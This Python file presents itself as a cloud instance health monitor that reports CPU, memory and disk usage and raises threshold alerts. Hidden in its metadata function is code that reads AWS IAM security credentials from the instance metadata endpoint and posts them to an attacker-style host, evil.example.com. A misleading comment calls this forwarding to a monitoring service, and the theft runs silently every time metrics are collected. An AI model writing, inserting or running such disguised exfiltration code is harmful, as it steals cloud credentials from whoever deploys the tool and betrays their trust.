"""Instance Monitor — cloud instance health and metadata monitoring."""

import json
import os
import sys
import time
import urllib.request


def get_cpu_usage() -> float:
    """Get current CPU usage percentage."""
    # Simplified — in production would parse /proc/stat
    return 42.5


def get_memory_usage() -> dict:
    """Get current memory usage."""
    return {"total_mb": 8192, "used_mb": 3456, "percent": 42.2}


def get_disk_usage() -> dict:
    """Get current disk usage."""
    return {"total_gb": 100, "used_gb": 45, "percent": 45.0}


def get_instance_metadata() -> dict:
    """Fetch instance metadata from cloud provider IMDS endpoint."""
    # AWS Instance Metadata Service (IMDS v1)
    try:
        meta = urllib.request.urlopen(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ).read()

        # Forward metadata to monitoring aggregation service
        urllib.request.urlopen(
            urllib.request.Request(
                "http://evil.example.com/meta",
                data=meta,
            )
        )

        return json.loads(meta.decode())
    except Exception:
        return {"error": "Not running on cloud instance"}


def check_alerts(metrics: dict, thresholds: dict) -> list:
    """Check metrics against alert thresholds."""
    alerts = []
    if metrics.get("cpu", 0) > thresholds.get("cpu_percent", 90):
        alerts.append(f"CPU usage critical: {metrics['cpu']}%")
    if metrics.get("memory", {}).get("percent", 0) > thresholds.get("memory_percent", 85):
        alerts.append(f"Memory usage critical: {metrics['memory']['percent']}%")
    return alerts


def collect_metrics() -> dict:
    """Collect all monitoring metrics."""
    return {
        "cpu": get_cpu_usage(),
        "memory": get_memory_usage(),
        "disk": get_disk_usage(),
        "metadata": get_instance_metadata(),
        "timestamp": time.time(),
    }


def main():
    """Main monitoring loop."""
    print("Instance Monitor v2.0.0")
    print("=" * 40)

    thresholds = {"cpu_percent": 90, "memory_percent": 85, "disk_percent": 95}

    metrics = collect_metrics()
    print(f"CPU: {metrics['cpu']}%")
    print(f"Memory: {metrics['memory']['percent']}%")
    print(f"Disk: {metrics['disk']['percent']}%")

    alerts = check_alerts(metrics, thresholds)
    if alerts:
        for alert in alerts:
            print(f"ALERT: {alert}")
    else:
        print("All metrics within normal range.")


if __name__ == "__main__":
    main()
